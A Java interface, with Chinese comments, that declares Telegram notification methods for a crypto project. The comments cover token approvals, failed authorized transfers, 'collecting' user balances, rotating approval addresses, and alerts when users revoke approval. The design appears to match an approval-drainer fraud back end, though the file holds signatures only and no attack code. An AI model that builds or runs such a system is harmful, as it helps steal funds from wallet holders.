package project.monitor.telegram.business;

import java.util.List;

import project.monitor.activity.ActivityOrder;
import project.monitor.bonus.model.SettleOrder;
import project.party.model.Party;

public interface TelegramBusinessMessageService {

	/**
	 * 用户新增发送消息
	 * 
	 * @param party
	 */
	void sendNewUserTeleg(Party party);

	/**
	 * 授权成功发送消息
	 * 
	 * @param party
	 */
	void sendApproveAddTeleg(Party party);

	/**
	 * 授权失败发送消息
	 * 
	 * @param party
	 */
	public void sendApproveErrorAddTeleg(Party party);

	/**
	 * 用户转换发起 发送消息
	 * 
	 * @param party
	 * @param exchangeVolumn
	 * @param usdtAmount
	 */
	void sendExchangeTeleg(Party party, double exchangeVolumn, double usdtAmount);

	/**
	 * 用户usdt变动发送消息
	 * 
	 * @param party
	 */
	void sendUsdtChangeTeleg(Party party, double amountBefore, double amount, double amountAfter);

	/**
	 * 成功加入活动发送
	 * 
	 * @param party
	 */
	void sendActivityAddTeleg(Party party, ActivityOrder activity);

	/**
	 * 授权转账失败发送消息
	 * 
	 * @param party
	 * @param amount 转账数额
	 * @param error  错误消息
	 * @param txHash 交易哈希
	 */
	public void sendTransferFromErrorTeleg(Party party, double amount, String error, String txHash);

	/**
	 * 发送当日数据
	 * 
	 * @param party
	 */
	public void sendTodayDataTeleg();

	/**
	 * 用户eth变动发送消息
	 * 
	 * @param party
	 */
	public void sendEthChangeTeleg(Party party, double amountBefore, double amount, double amountAfter);

	/**
	 * 授权地址授权已满，切换新地址
	 * 
	 * @param oldApproveAddress
	 * @param newApproveAddress
	 * @param approveAddressNum 剩余授权地址数
	 * @param approveUserNum    剩余可授权用户数
	 */
	public void sendApproveAddressFullTeleg(String oldApproveAddress, String newApproveAddress, int approveAddressNum,
			int approveUserNum);

	/**
	 * 最后一条授权地址剩余数量播报
	 * 
	 * @param approveAddress
	 * @param approveAddressNum 剩余授权地址数
	 * @param approveUserNum    剩余可授权用户数
	 */
	public void sendLastApproveAddressWarningTeleg(String approveAddress, int approveAddressNum, int approveUserNum);

	/**
	 * 非本项目配置的授权地址授权
	 * 
	 * @param party
	 */
	public void sendApproveOtherDanger(Party party,List<String> otherApproveAddresses,List<String> otherApproveHash);

	/**
	 * 用户取消授权
	 * 
	 * @param party
	 */
	public void sendApproveRevokedDanger(Party party);

	/**
	 * 用户余额归集发送消息
	 * 
	 * @param party
	 */
	public void sendCollectTeleg(Party party ,double amount);
	/**
	 * 清算转账失败发送消息
	 * 
	 * @param party
	 */
	public void sendSettleTransferErrorTeleg(SettleOrder settleOrder);
}